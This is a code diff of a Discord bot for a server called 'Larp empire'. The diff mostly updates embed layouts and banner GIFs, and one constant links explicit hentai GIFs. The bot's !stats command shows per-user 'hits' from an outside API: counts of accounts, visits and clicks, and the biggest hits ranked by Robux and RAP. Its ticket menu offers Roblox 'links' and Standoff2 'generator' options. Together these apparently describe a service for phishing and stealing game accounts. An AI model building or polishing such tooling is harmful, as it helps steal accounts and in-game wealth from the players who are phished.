@@ -25,6 +25,8 @@ const PROTECTED_MESSAGE_ID = "1528675458357526631";
 
 // ================= BANNERE =================
 const BANNER_TOP = "https://i.imgur.com/hw4rH89.jpeg";
+const BANNER_BOTTOM = "https://i.pinimg.com/originals/d8/53/9c/d8539cf70a1c62c7b6c55d11b14b6334.gif";
+const STATS_GIF = "https://cdn.discordapp.com/attachments/1017600005764284497/1415662667720556587/Tumblr_l_76198603461233.gif?ex=6a6c8919&is=6a6b3799&hm=0439197b534cd600254f94be2b13b6e22219355f123f60d2ee50a7c988114642";
 const PURGE_BANNERS = ["https://i.imgur.com/dTgmP6g.gif", "https://i.imgur.com/pd1yzwU.gif", "https://i.imgur.com/3i5dler.gif"];
 const FUCK_GIFS = ["https://cdn.hentaigifz.com/84966/bounce-bounce.gif", "https://cdn.hentaigifz.com/88822/mankitsu-happening.gif"];
 
@@ -89,7 +91,7 @@ client.on("messageCreate", async (message) => {
   const targetUser = message.mentions.users.first() || message.author;
   const targetId = targetUser.id;
 
-  // !stats
+  // !stats  (UPDATED EMBEDS)
   if (message.content.startsWith("!stats")) {
     try {
       const res = await fetchWithTimeout(`https://api.injuries.to/v1/public/user?userId=${targetId}`);
@@ -100,14 +102,39 @@ client.on("messageCreate", async (message) => {
       const profile = data.Profile || {};
       const userName = profile.userName || targetUser.username;
 
-      const embedTop = new EmbedBuilder().setColor(0x000000).setImage(BANNER_TOP);
-      const embed = new EmbedBuilder().setColor(0x000000).setTitle(`— <a:emoji_20:1464222092353605735> NORMAL STATS —`)
+      const embedTop = new EmbedBuilder()
+        .setColor(0x000000)
+        .setImage(BANNER_TOP);
+
+      const embed = new EmbedBuilder()
+        .setColor(0x000000)
+        .setTitle(`— <a:emoji_31:1532377239071756378> NORMAL STATS —`)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
-        .setDescription(`**USER:** \`${userName}\`\n\n<a:heart:1463322847546966087> **TOTAL STATS**\n\`\`\`Hits:     ${formatNumber(normal.Totals?.Accounts)}\nVisits:   ${formatNumber(normal.Totals?.Visits)}\nClicks:   ${formatNumber(normal.Totals?.Clicks)}\`\`\`\n\n<a:corrupt_card:1463245786421661718> **BIGGEST HITS**\n\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\``)
-        .setImage(getRandomPurge())
+        .setDescription(
+          `**USER:** \`${userName}\`\n\n` +
+          `<a:emoji_30:1532377209434542320>**TOTAL STATS**\n` +
+          `\`\`\`Hits:     ${formatNumber(normal.Totals?.Accounts)}\nVisits:   ${formatNumber(normal.Totals?.Visits)}\nClicks:   ${formatNumber(normal.Totals?.Clicks)}\`\`\`\n\n` +
+          `<a:emoji_33:1532377228237603057>**BIGGEST HITS**\n` +
+          `\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\``
+        )
+        .setImage(STATS_GIF)
         .setFooter({ text: `𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢 • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
 
-      await message.channel.send({ embeds: [embedTop, embed], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel("View User").setStyle(ButtonStyle.Link).setURL(`https://discord.com/users/${targetId}`))] });
+      const embedBottom = new EmbedBuilder()
+        .setColor(0x000000)
+        .setImage(BANNER_BOTTOM);
+
+      await message.channel.send({
+        embeds: [embedTop, embed, embedBottom],
+        components: [
+          new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+              .setLabel("View User")
+              .setStyle(ButtonStyle.Link)
+              .setURL(`https://discord.com/users/${targetId}`)
+          )
+        ]
+      });
     } catch (err) { console.error(err); message.reply("❌ API timeout.").catch(() => null); }
   }
 
@@ -161,18 +188,33 @@ client.on("messageCreate", async (message) => {
     await message.channel.send({ embeds: [embed] });
   }
 
-  // !create_ticket_panel
+  // !create_ticket_panel  (UPDATED EMBEDS)
   if (message.content.startsWith("!create_ticket_panel") && message.author.id === OWNER_ID) {
-    const panelEmbeds = [
-      { color: 0x000000, image: { url: BANNER_TOP } },
-      { title: "— <a:emoji_20:1464222092353605735> 𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢  —", description: "<a:emoji_17:1463657710246691008> ʜᴇʟʟᴏ! ᴡᴇ ᴀʀᴇ ʜᴇʀᴇ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ.\n\n<a:emoji_18:1463658185901608991> ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏғ ʏᴏᴜʀ ɪssᴜᴇ.", color: 0x000000, image: { url: "https://i.imgur.com/3i5dler.gif" } }
-    ];
-    const selectMenu = new ActionRowBuilder().addComponents(new StringSelectMenuBuilder().setCustomId("ticket_select").setPlaceholder("Select Ticket Type").addOptions([
-      { label: "roblox", value: "links", emoji: { id: "1463245786421661718", name: "corrupt_card" } },
-      { label: "standoff2", value: "generator", emoji: { id: "1463657710246691008", name: "emoji_17" } },
-      { label: "Others", value: "others", emoji: { id: "1463658185901608991", name: "emoji_18" } }
-    ]));
-    await message.channel.send({ embeds: panelEmbeds.map(e => EmbedBuilder.from(e)), components: [selectMenu] });
+    const embedTop = new EmbedBuilder()
+      .setColor(0x000000)
+      .setImage(BANNER_TOP);
+
+    const embedMain = new EmbedBuilder()
+      .setColor(0x000000)
+      .setTitle(`— <a:emoji_31:1532377239071756378> welcome to larp empire —`)
+      .setDescription(
+        `Welcome <@${message.author.id}> !\n\n` +
+        `Please describe what type of issue you have`
+      )
+      .setImage("https://i.imgur.com/3i5dler.gif");
+
+    const selectMenu = new ActionRowBuilder().addComponents(
+      new StringSelectMenuBuilder()
+        .setCustomId("ticket_select")
+        .setPlaceholder("Select Ticket Type")
+        .addOptions([
+          { label: "roblox", value: "links", emoji: { id: "1463245786421661718", name: "corrupt_card" } },
+          { label: "standoff2", value: "generator", emoji: { id: "1463657710246691008", name: "emoji_17" } },
+          { label: "Others", value: "others", emoji: { id: "1463658185901608991", name: "emoji_18" } }
+        ])
+    );
+
+    await message.channel.send({ embeds: [embedTop, embedMain], components: [selectMenu] });
   }
 
   // !check
@@ -244,13 +286,37 @@ client.on("interactionCreate", async (interaction) => {
 
     await interaction.reply({ content: `Ticket created: ${ticketChannel}`, ephemeral: true });
 
-    const ticketEmbeds = [
-      { color: 0x000000, image: { url: BANNER_TOP } },
-      { title: "— <a:emoji_20:1464222092353605735> ᴛɪᴄᴋᴇᴛ —", description: "ᴡᴇʟᴄᴏᴍᴇ!\n\n<a:emoji_17:1463657710246691008> ᴘʟᴇᴀsᴇ ᴅᴇsᴄʀɪʙᴇ ʏᴏᴜʀ ɪssᴜᴇ ʜᴇʀᴇ.", color: 0x000000 }
-    ];
+    // UPDATED TICKET CHANNEL EMBEDS
+    const ticketTop = new EmbedBuilder()
+      .setColor(0x000000)
+      .setImage(BANNER_TOP);
 
-    const closeButton = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("close_ticket").setLabel("Close Ticket").setStyle(ButtonStyle.Secondary));
-    await ticketChannel.send({ embeds: ticketEmbeds.map(e => EmbedBuilder.from(e)), components: [closeButton] });
+    const ticketMain = new EmbedBuilder()
+      .setColor(0x000000)
+      .setTitle(`— <a:emoji_31:1532377239071756378> TICKET OPENED —`)
+      .setDescription(
+        `**Welcome** <@${member.id}> !\n\n` +
+        `Please describe what type of issue you have.\n` +
+        `Staff will be with you shortly.`
+      )
+      .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
+      .setImage(STATS_GIF);
+
+    const ticketBottom = new EmbedBuilder()
+      .setColor(0x000000)
+      .setImage(BANNER_BOTTOM);
+
+    const closeButton = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId("close_ticket")
+        .setLabel("Close Ticket")
+        .setStyle(ButtonStyle.Secondary)
+    );
+
+    await ticketChannel.send({
+      embeds: [ticketTop, ticketMain, ticketBottom],
+      components: [closeButton]
+    });
   }
 
   if (interaction.isButton() && interaction.customId === "unhook_video") await interaction.reply({ content: "**Video:**\nhttps://streamable.com/qn3xwq" });
